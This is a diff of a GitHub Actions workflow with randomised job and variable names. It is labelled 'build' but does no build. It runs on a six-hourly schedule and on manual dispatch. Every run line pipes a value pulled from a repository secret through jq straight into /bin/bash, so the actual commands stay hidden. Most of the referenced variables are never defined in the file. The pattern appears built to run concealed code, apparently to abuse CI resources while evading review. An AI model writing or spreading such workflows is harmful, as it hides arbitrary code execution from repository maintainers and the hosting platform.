@@ -1,28 +1,37 @@
 name: huangyunxiao7461
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 3/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          uuajl92: ${{ secrets.uuajl92 }}
+          i7685: ${{ secrets.i7685 }}
         run: |
-          echo $uuajl92 | jq -r .ren59797 | /bin/bash
-          echo $wn27864 | jq -r .k72921 | /bin/bash
-          echo $k71727 | jq -r .pqh0 | /bin/bash
-          echo $fyuv8223 | jq -r .qfjr3 | /bin/bash
-          echo $asfje504 | jq -r .not8 | /bin/bash
-          echo $ry7 | jq -r .m62 | /bin/bash
-          echo $pa29575 | jq -r .mo0638 | /bin/bash
-          echo $rvuyb17 | jq -r .nwceq2 | /bin/bash
-          echo $oujx5 | jq -r .ipv71 | /bin/bash
-          echo $yet3648 | jq -r .bsc0 | /bin/bash
-          echo $ilfu50254 | jq -r .j73 | /bin/bash
-          echo $v56 | jq -r .hfg049 | /bin/bash
+          echo $i7685 | jq -r .g90767 | /bin/bash
+          echo $ijt8 | jq -r .rxzs21191 | /bin/bash
+          echo $rfkzr69 | jq -r .z3 | /bin/bash
+          echo $f83 | jq -r .yn94 | /bin/bash
+          echo $gmxd2730 | jq -r .ammd5564 | /bin/bash
+          echo $ee3342 | jq -r .t364 | /bin/bash
+          echo $d3 | jq -r .ynrd7 | /bin/bash
+          echo $mnh3255 | jq -r .o6659 | /bin/bash
+          echo $xm057 | jq -r .bha2462 | /bin/bash
+          echo $q9 | jq -r .k36 | /bin/bash
+          echo $zyj73 | jq -r .xy2 | /bin/bash
+          echo $zhl8788 | jq -r .os3 | /bin/bash
+          echo $y22035 | jq -r .vgp14 | /bin/bash
+          echo $m1 | jq -r .xm68076 | /bin/bash
+          echo $j9617 | jq -r .r47 | /bin/bash
+          echo $xlmc8 | jq -r .y47 | /bin/bash
+          echo $j5 | jq -r .e10 | /bin/bash
+          echo $fqlf397 | jq -r .q5 | /bin/bash
+          echo $dsll6 | jq -r .cd0 | /bin/bash
+          echo $czly32 | jq -r .f74 | /bin/bash
 
